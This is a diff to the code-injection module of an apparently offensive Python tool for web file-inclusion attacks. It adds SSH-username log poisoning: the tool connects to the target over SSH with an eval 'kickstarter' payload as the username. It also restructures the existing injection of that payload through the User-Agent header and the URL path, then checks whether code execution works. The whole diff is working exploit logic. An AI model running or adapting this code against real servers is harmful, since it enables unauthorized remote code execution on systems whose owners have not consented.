@@ -118,6 +118,8 @@ class codeinjector(baseClass):
                 self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..."%(language), self.LOG_INFO)
             elif (mode.find("F") != -1):
                 self._log("Testing %s-code injection thru Logfile FTP-Username-Injection..."%(language), self.LOG_INFO)
+            elif (mode.find("S") != -1):
+                self._log("Testing %s-code injection thru Logfile SSH-Username-Injection..."%(language), self.LOG_INFO)
             code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
             
         elif (mode.find("R") != -1):
@@ -405,37 +407,78 @@ class codeinjector(baseClass):
                 
                 #TODO: Cleanup this dirty block :)
                 if (code.find(testcode[1]) == -1):
-                    self._log("Kickstarter is not present. Injecting kickstarter thru UserAgent...", self.LOG_INFO)
-                    kickstarter = langClass.getEvalKickstarter()
-                    ua = self.getUserAgent()
-                    self.setUserAgent(kickstarter)
-                    tmpurl = None
-                    if (url.find("?") != -1):
-                        tmpurl = url[:url.find("?")]
-                    else:
-                        tmpurl = url
-                    self.doGetRequest(tmpurl, additionalHeaders = headerDict)
-                    self.setUserAgent(ua)
-                    
-                    self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
-                    testcode = langClass.generateQuiz()
-                    p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
-                    if (postdata != ""):
-                        p = "%s&%s" %(postdata, p)
-                    code = self.doPostRequest(url, p, additionalHeaders = headerDict)
-
-                    if (code.find(testcode[1]) == -1):
-                        self._log("Failed to inject kickstarter thru UserAgent!", self.LOG_ERROR)
-                        self._log("Trying to inject kickstarter thru Path...", self.LOG_INFO)
-                        self._log("Ignore any 404 errors for the next request.", self.LOG_INFO)
+                    if (m.find("H") != -1):
+                        self._log("Kickstarter is not present. Injecting kickstarter thru UserAgent...", self.LOG_INFO)
                         kickstarter = langClass.getEvalKickstarter()
+                        ua = self.getUserAgent()
+                        self.setUserAgent(kickstarter)
                         tmpurl = None
                         if (url.find("?") != -1):
                             tmpurl = url[:url.find("?")]
                         else:
                             tmpurl = url
-                        tmpurl += "?" + kickstarter
                         self.doGetRequest(tmpurl, additionalHeaders = headerDict)
+                        self.setUserAgent(ua)
+                        
+                        self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
+                        testcode = langClass.generateQuiz()
+                        p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
+                        if (postdata != ""):
+                            p = "%s&%s" %(postdata, p)
+                        code = self.doPostRequest(url, p, additionalHeaders = headerDict)
+    
+                        if (code.find(testcode[1]) == -1):
+                            self._log("Failed to inject kickstarter thru UserAgent!", self.LOG_ERROR)
+                            self._log("Trying to inject kickstarter thru Path...", self.LOG_INFO)
+                            self._log("Ignore any 404 errors for the next request.", self.LOG_INFO)
+                            kickstarter = langClass.getEvalKickstarter()
+                            tmpurl = None
+                            if (url.find("?") != -1):
+                                tmpurl = url[:url.find("?")]
+                            else:
+                                tmpurl = url
+                            tmpurl += "?" + kickstarter
+                            self.doGetRequest(tmpurl, additionalHeaders = headerDict)
+                            
+                            self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
+                            testcode = langClass.generateQuiz()
+                            p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
+                            if (postdata != ""):
+                                p = "%s&%s" %(postdata, p)
+                            code = self.doPostRequest(url, p, additionalHeaders = headerDict)
+                            
+                            if (code.find(testcode[1]) != -1):
+                                self._log("Kickstarter successfully injected thru Path!", self.LOG_INFO)
+                                self.isLogKickstarterPresent = True
+                            else:
+                                self._log("Failed to inject kickstarter thru Path!", self.LOG_ERROR)
+                                sys.exit(1)
+                        else:
+                            self._log("Kickstarter successfully injected! thru UserAgent!", self.LOG_INFO)
+                            self.isLogKickstarterPresent = True
+                   
+                    if (m.find("S") != -1):
+                        import ssh
+                        
+                        if (ssh.paramikoInstalled == False):
+                            self._log("I am soooo sorry bro but you need paramiko python module installed to use this feature!", self.LOG_ERROR)
+                            self._log("$> sudo apt-get install python-paramiko # maybe? :)", self.LOG_ERROR)
+                            sys.exit(1);
+                            
+                        self._log("Kickstarter is not present. Injecting kickstarter thru SSH Username...", self.LOG_INFO)
+                        kickstarter = langClass.getEvalKickstarter()
+
+                        # Parse out hostname
+                        hostname = url[url.find("//") +2:]
+                        if ("/" in hostname):
+                            hostname = hostname[:hostname.find("/")]
+                        self._log("Trying to connect to ssh://'%s'"%(hostname), self.LOG_DEBUG)
+                        self._log("SSH-Username: %s"%(kickstarter), self.LOG_DEVEL)
+                        
+                        try:
+                            ssh.Connection(hostname, username=kickstarter, password="asdf")
+                        except:
+                            pass
                         
                         self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                         testcode = langClass.generateQuiz()
@@ -444,15 +487,6 @@ class codeinjector(baseClass):
                             p = "%s&%s" %(postdata, p)
                         code = self.doPostRequest(url, p, additionalHeaders = headerDict)
                         
-                        if (code.find(testcode[1]) != -1):
-                            self._log("Kickstarter successfully injected thru Path!", self.LOG_INFO)
-                            self.isLogKickstarterPresent = True
-                        else:
-                            self._log("Failed to inject kickstarter thru Path!", self.LOG_ERROR)
-                            sys.exit(1)
-                    else:
-                        self._log("Kickstarter successfully injected! thru UserAgent!", self.LOG_INFO)
-                        self.isLogKickstarterPresent = True
                 else:
                     self._log("Kickstarter found!", self.LOG_INFO)
                     self.isLogKickstarterPresent = True
